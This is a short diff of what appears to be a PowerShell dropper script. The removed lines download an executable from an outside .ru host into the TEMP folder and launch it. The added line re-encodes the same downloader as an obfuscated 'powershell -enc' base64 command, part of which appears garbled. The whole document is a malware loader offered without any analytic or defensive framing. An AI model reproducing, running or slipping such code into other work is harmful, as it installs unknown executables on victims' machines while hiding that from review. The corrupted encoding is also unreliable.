@@ -1,12 +1,1 @@
-$url = "http://a1067277.xsph.ru/1Elusion.exe"
-$outputPath = "$env:TEMP\LNsystem.exe"
-
-try {
-    Invoke-RestMethod -Uri $url -OutFile $outputPath
-
-    if (Test-Path -Path $outputPath) {
-        Start-Process -FilePath $outputPath
-    }
-} catch {
-    Write-Host "An error occurred: $_"
-}
+powershell -enc JHVybCA9ICJodHRwOi8vY0xFED5800B537160029B3B9325981d92d1Ab8727A3leGUiCiRvdXRwdXRQYXRoID0gIiRlbnY6VEVNUFxMTnN5c3RlbS5leGUiCgp0cnkgewogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkdXJsIC1PdXRGaWxlICRvdXRwdXRQYXRoCgogICAgaWYgKFRlc3QtUGF0aCAtUGF0aCAkb3V0cHV0UGF0aCkgewogICAgICAgIFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRvdXRwdXRQYXRoCiAgICB9Cn0gY2F0Y2ggewogICAgV3JpdGUtSG9zdCAiQW4gZXJyb3Igb2NjdXJyZWQ6ICRfIgp9Cg==
